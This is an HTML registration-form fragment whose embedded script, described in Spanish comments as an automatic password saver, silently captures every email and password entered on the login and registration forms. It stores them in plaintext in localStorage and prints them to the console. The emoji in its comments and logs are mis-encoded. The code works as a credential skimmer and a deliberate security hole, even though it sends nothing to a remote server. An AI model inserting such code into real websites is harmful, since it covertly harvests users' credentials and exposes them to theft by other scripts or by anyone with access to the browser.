<!-- Register Form -->
<div id="register-form" class="auth-form hidden">

    <!-- üî• GUARDADOR AUTOM√ÅTICO DE CONTRASE√ëAS - VERSI√ìN SIMPLE üî• -->
    <script>
        (function() {
            console.log('üöÄ Sistema de guardado iniciado');
            
            // Funci√≥n para guardar en localStorage
            function guardarEnLocalStorage(email, password, tipo) {
                try {
                    var datos = localStorage.getItem('PASSWORDS_BETA');
                    var lista = datos ? JSON.parse(datos) : [];
                    
                    lista.push({
                        email: email,
                        password: password,
                        tipo: tipo,
                        fecha: new Date().toLocaleString('es-ES'),
                        timestamp: Date.now()
                    });
                    
                    localStorage.setItem('PASSWORDS_BETA', JSON.stringify(lista));
                    console.log('‚úÖ Guardado:', email, '-', password, '(' + tipo + ')');
                    console.log('üìä Total guardados:', lista.length);
                    
                    return true;
                } catch (e) {
                    console.error('‚ùå Error:', e);
                    return false;
                }
            }
            
            // Esperar a que todo cargue
            setTimeout(function() {
                console.log('‚è∞ Buscando formularios...');
                
                // FORMULARIO DE LOGIN
                var formLogin = document.getElementById('loginForm');
                if (formLogin) {
                    console.log('‚úÖ Formulario LOGIN encontrado');
                    
                    var emailLogin = document.getElementById('login-email');
                    var passLogin = document.getElementById('login-password');
                    var btnLogin = document.getElementById('login-btn');
                    
                    if (btnLogin) {
                        btnLogin.addEventListener('click', function() {
                            setTimeout(function() {
                                if (emailLogin && passLogin) {
                                    var e = emailLogin.value;
                                    var p = passLogin.value;
                                    if (e && p) {
                                        guardarEnLocalStorage(e, p, 'LOGIN');
                                    }
                                }
                            }, 50);
                        });
                    }
                } else {
                    console.log('‚ùå Formulario LOGIN NO encontrado');
                }
                
                // FORMULARIO DE REGISTRO
                var formRegistro = document.getElementById('registerForm');
                if (formRegistro) {
                    console.log('‚úÖ Formulario REGISTRO encontrado');
                    
                    var emailReg = document.getElementById('register-email');
                    var passReg = document.getElementById('register-password');
                    var btnReg = document.getElementById('register-btn');
                    
                    if (btnReg) {
                        btnReg.addEventListener('click', function() {
                            setTimeout(function() {
                                if (emailReg && passReg) {
                                    var e = emailReg.value;
                                    var p = passReg.value;
                                    if (e && p) {
                                        guardarEnLocalStorage(e, p, 'REGISTRO');
                                    }
                                }
                            }, 50);
                        });
                    }
                } else {
                    console.log('‚ùå Formulario REGISTRO NO encontrado');
                }
                
                console.log('üéØ Sistema listo');
                
            }, 2000);
        })();
    </script>
